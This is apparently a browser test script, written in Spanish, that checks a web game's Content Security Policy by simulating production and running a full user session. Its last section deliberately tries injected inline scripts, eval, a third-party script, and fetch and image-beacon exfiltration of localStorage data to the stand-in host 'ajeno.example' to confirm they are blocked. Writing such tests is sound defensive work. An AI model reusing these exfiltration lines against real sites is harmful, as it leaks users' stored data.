// La política de seguridad (CSP, deploy/csp.mjs) del paquete publicado: no rompe
// nada de un recorrido completo y corta lo que tiene que cortar.
//
// La política solo existe en lo publicado y lleva escritas las direcciones de
// producción, así que no se puede probar en el servidor de desarrollo. Esta
// prueba monta el paquete como lo hace `srv subir` y lo sirve haciendo creer al
// navegador que está en producción (lib/produccion-local.mjs); nada sale a
// Internet. Hace falta solo la API local en marcha.
//
//   node politica-de-seguridad.mjs               monta el paquete y lo prueba (unos 2 min)
//   node politica-de-seguridad.mjs <carpeta web> prueba un paquete ya montado
//
// Pasarla antes de publicar cualquier cambio que haga a la página cargar o
// llamar algo nuevo: lo que la política no prevé falla solo en producción.
import { chromium, MOVIL, ok, espera, fallar, terminar, soloLocal } from './lib/comun.mjs';
import { montarPaquete, RAIZ_REPO } from './lib/montar-paquete.mjs';
import { direcciones, simularProduccion, vigilarCsp } from './lib/produccion-local.mjs';

soloLocal();

const carpetaWeb = process.argv[2] ?? montarPaquete();
const { web: WEB_REAL, api: API_REAL } = direcciones(carpetaWeb, RAIZ_REPO);
const ANALITICA = 'https://webanalytics-api.angelgf.com.es';
const BUZON = 'https://gestorsugerencias-api.angelgf.com.es';

// Puente de la app Android simulado, para pasar por el código de anuncios y de compartir.
function puenteAndroid() {
  window.__puente = { anuncios: 0, compartido: 0 };
  window.AndroidAds = { showInterstitial() { window.__puente.anuncios++; }, privacyOptionsRequired() { return true; }, showPrivacyOptions() {} };
  window.AndroidShare = { share() { window.__puente.compartido++; } };
}

const browser = await chromium.launch({ channel: 'chrome', headless: true });
const enviadas = [];
try {
  const ctx = await browser.newContext({ ...MOVIL });
  const { cortadas } = await simularProduccion(ctx, carpetaWeb, {
    web: WEB_REAL, api: API_REAL,
    otros: {
      // La analítica: un script que, como el de verdad, se ejecuta y envía una visita.
      [ANALITICA]: (req) => {
        enviadas.push(`${req.method()} analítica`);
        return /tracker\.js/.test(req.url())
          ? { status: 200, contentType: 'text/javascript', body: `window.__tracker = 1; fetch('${ANALITICA}/api/visits', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' }).then(function () { window.__visita = 1; }, function () { window.__visita = 0; });` }
          : { status: 200, contentType: 'application/json', body: '{}' };
      },
      [BUZON]: (req) => { enviadas.push(`${req.method()} buzón`); return { status: 200, contentType: 'application/json', body: '{}' }; },
    },
  });
  await ctx.addInitScript(vigilarCsp);
  await ctx.addInitScript(puenteAndroid);
  const page = await ctx.newPage();
  const consola = [];
  page.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) consola.push(m.text().slice(0, 200)); });
  page.on('pageerror', (e) => console.log(`  [pageerror] ${e.message.slice(0, 200)}`));
  const violaciones = async () => [...new Set([...(await page.evaluate(() => window.__csp ?? [])), ...consola])];

  console.log('== A. La política está y la app arranca ==');
  await page.goto(WEB_REAL + '/', { waitUntil: 'load' });
  const politica = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? null);
  ok(!!politica, `el paquete lleva la política: ${politica ? politica.slice(0, 110) + '…' : 'no hay ninguna'}`);
  ok(await espera(page.waitForSelector('.lobby .game-title', { timeout: 60_000 })), 'Blazor arranca y pinta el lobby');
  ok(await page.evaluate(() => document.fonts.ready.then(() => [...document.fonts].some((f) => f.status === 'loaded'))), 'la fuente del logo carga');
  ok(await page.evaluate(() => window.__tracker === 1), 'el script de analítica se ejecuta');
  ok(await espera(page.waitForFunction(() => window.__visita === 1, null, { timeout: 5000 })), 'y puede enviar su visita');
  ok(await espera(page.waitForFunction(() => navigator.serviceWorker.getRegistration().then((r) => !!r), null, { timeout: 8000 })), 'el service worker se registra');

  console.log('== B. Recorrido completo ==');
  await page.click('.btn-help'); await page.waitForSelector('.help-modal'); await page.keyboard.press('Escape');
  await page.click('.btn-sug');
  await page.fill('#sug-email', 'prueba@example.com');
  await page.fill('.sug-textarea', 'Mensaje de prueba de la política de seguridad.');
  await page.locator('.sug-actions .btn-primary').click();
  ok(await espera(page.waitForSelector('.sug-success-icon', { timeout: 8000 })) && enviadas.includes('POST buzón'), 'el buzón de sugerencias puede enviar');
  await page.locator('button:has-text("Cerrar")').click();
  await page.fill('#nombre-jugador', 'Ana');
  await page.click('.btn-play-now');
  ok(await espera(page.waitForSelector('.turn-indicator.my-turn', { timeout: 20_000 })), 'se crea la partida y llega tu turno (API y WebSocket)');
  await page.click('.btn-pass');
  ok(await espera(page.waitForSelector('.results-view .result-entry', { timeout: 40_000 })), 'los bots juegan y llegan los resultados en directo');
  await page.click('.btn-share');
  ok(await espera(page.waitForFunction(() => window.__puente.compartido === 1, null, { timeout: 8000 })), 'compartir genera la imagen de la jugada');
  await page.click('.continue-buttons .btn-primary');
  ok(await espera(page.waitForSelector('.round-badge:has-text("Ronda 2")', { timeout: 20_000 })) && await page.evaluate(() => window.__puente.anuncios === 1), 'el anuncio se pide y empieza la ronda 2');
  await page.waitForSelector('.turn-indicator.my-turn', { timeout: 40_000 });
  await page.click('.btn-leave'); await page.click('.leave-confirm .btn-danger');
  await page.waitForSelector('.lobby .game-title', { timeout: 15_000 });
  await page.goto(WEB_REAL + '/privacidad.html', { waitUntil: 'load' });
  ok((await page.locator('h1').textContent()).toLowerCase().includes('privacidad'), 'la página de privacidad se ve');
  const enPrivacidad = await violaciones();
  await page.goBack({ waitUntil: 'load' });
  await page.waitForSelector('.lobby .game-title', { timeout: 60_000 });
  const v = [...new Set([...enPrivacidad, ...(await violaciones())])];
  ok(v.length === 0, `ninguna violación de la política en todo el recorrido${v.length ? ':\n        ' + v.join('\n        ') : ''}`);
  ok(cortadas.length === 0, `la web no ha pedido nada a ningún otro sitio${cortadas.length ? ': ' + [...new Set(cortadas)].join(', ') : ''}`);

  console.log('== C. Lo que la política tiene que cortar ==');
  // Dentro de un setTimeout: lo que page.evaluate ejecuta directamente está exento de la
  // política (el navegador lo trata como la consola), y eval parecería permitido.
  const colado = await page.evaluate(() => new Promise((fin) => window.setTimeout(async () => {
    const r = {};
    const s = document.createElement('script'); s.textContent = 'window.__colado = 1;'; document.head.append(s);
    r.enLinea = window.__colado === 1;
    try { r.eval = (0, eval)('1+1') === 2; } catch { r.eval = false; }
    try { r.funcion = new Function('return 2')() === 2; } catch { r.funcion = false; }
    r.ajeno = await new Promise((f) => { const e = document.createElement('script'); e.src = 'https://ajeno.example/x.js'; e.onload = () => f(true); e.onerror = () => f(false); document.head.append(e); });
    r.fuga = await fetch('https://ajeno.example/robo?asientos=' + encodeURIComponent(localStorage.getItem('triker_asientos') ?? '')).then(() => true, () => false);
    r.imagen = await new Promise((f) => { const i = new Image(); i.onload = () => f(true); i.onerror = () => f(false); i.src = 'https://ajeno.example/p.png?d=' + Date.now(); });
    fin(r);
  }, 0)));
  ok(colado.enLinea === false, 'un script en línea inyectado no se ejecuta');
  ok(colado.eval === false && colado.funcion === false, 'eval y new Function están cortados');
  ok(colado.ajeno === false, 'un script de otro sitio no se carga');
  ok(colado.fuga === false, 'la página no puede enviar datos a otro sitio');
  ok(colado.imagen === false, 'ni sacarlos pidiendo una imagen a otro sitio');
  const intentadas = cortadas.filter((c) => /ajeno\.example/.test(c));
  ok(intentadas.length === 0, `y lo corta el navegador antes de salir a la red (${intentadas.length} peticiones llegaron a intentarse)`);
} catch (e) {
  fallar(e);
} finally {
  await browser.close();
}
terminar();
